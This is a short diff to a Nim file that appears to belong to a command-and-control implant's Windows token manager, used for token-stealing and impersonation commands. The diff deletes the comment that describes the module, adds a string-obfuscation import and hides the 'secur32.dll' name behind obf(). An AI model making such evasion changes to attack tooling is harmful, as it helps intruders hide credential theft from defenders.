@@ -1,13 +1,11 @@
-## Token Manager - Stores and manages impersonation tokens
-## Used by make_token, steal_token, and rev2self commands
-
 when defined(windows):
   import winim/lean
   import std/widestrs
+  import ../utils/strenc
   
   # Import GetUserNameExW from Secur32.dll
   proc GetUserNameExW(NameFormat: DWORD, lpNameBuffer: LPWSTR, nSize: ptr DWORD): WINBOOL 
-    {.importc, dynlib: "secur32.dll", stdcall.}
+    {.importc, dynlib: obf("secur32.dll"), stdcall.}
   
   # Global token handle for impersonation
   var globalTokenHandle*: HANDLE = 0
